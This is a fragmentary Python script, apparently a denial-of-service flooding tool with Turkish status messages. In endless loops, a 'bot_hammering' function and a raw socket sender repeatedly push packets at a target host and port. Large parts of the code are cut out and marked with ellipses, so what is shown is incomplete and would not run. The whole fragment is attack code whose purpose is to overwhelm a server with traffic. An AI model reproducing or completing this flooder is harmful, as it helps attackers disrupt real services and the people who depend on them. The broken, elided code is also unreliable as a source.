...
def bot_hammering(url):
	try:
		while True:
			...
			print("\033[94mPaket gönderiliyor...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)
	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m Paket gönderildi Efecim. \033[0m")
			else:
				s.shutdown(1)
...
if __name__ == '__main__':
	...
	print("\033[94mPaket hazırlanıyor Efecim...\033[0m")
	user_agent()
	my_bots()
	time.sleep(5)
	try:
